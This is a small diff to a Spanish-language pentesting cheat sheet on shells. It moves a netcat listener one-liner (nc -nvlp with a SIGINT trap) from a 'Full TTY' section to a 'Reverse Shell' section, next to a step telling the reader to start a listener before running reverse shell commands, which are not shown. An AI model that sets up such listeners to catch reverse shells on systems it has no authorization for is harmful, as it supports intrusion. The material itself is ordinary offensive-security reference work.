@@ -21,7 +21,6 @@
 
 ### Full TTY
 Te permite tener una consola interactiva
-> nc -nvlp \<PORT> & trap "printf '\003' >/proc/$\!/fd/0" INT; fg; trap 0 INT
 * [Full TTYs](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys)
 
 ### Python
@@ -30,6 +29,7 @@ Te permite tener una consola interactiva
 ### Reverse Shell
 Se debe ejecutar en la máquina local primero alguna herramienta para poner en escucha el <PORT>,
 como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```
+> nc -nvlp \<PORT> & trap "printf '\003' >/proc/$\!/fd/0" INT; fg; trap 0 INT
 
 Y luego usar alguno de los siguientes comandos
 
